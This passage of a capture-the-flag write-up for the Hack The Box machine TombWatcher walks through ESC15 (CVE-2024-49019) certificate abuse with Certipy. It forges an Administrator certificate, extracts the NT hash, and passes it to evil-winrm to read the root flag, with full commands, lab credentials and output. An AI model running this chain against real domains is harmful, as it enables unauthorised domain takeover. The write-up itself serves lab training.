    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

We can try [this](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) ESC15 from official Certipy. There are two scenario there but Scenario B has less work to do so we will use it.
## ESC15 

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.**

```bash
❯ certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Password@123456' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.**

```bash
❯ certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Password@123456' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Step 3: Authenticate as the privileged user using the "on-behalf-of" certificate.**

```bash
❯ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```
## Pass The Hash

```bash
❯ evil-winrm -i 10.10.11.72 -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop\
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/5/2025  10:02 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4aa65c4bc041de90909ce10dcf1ca971
```
## Time Reset

```bash
❯ sudo timedatectl set-ntp on
```

---
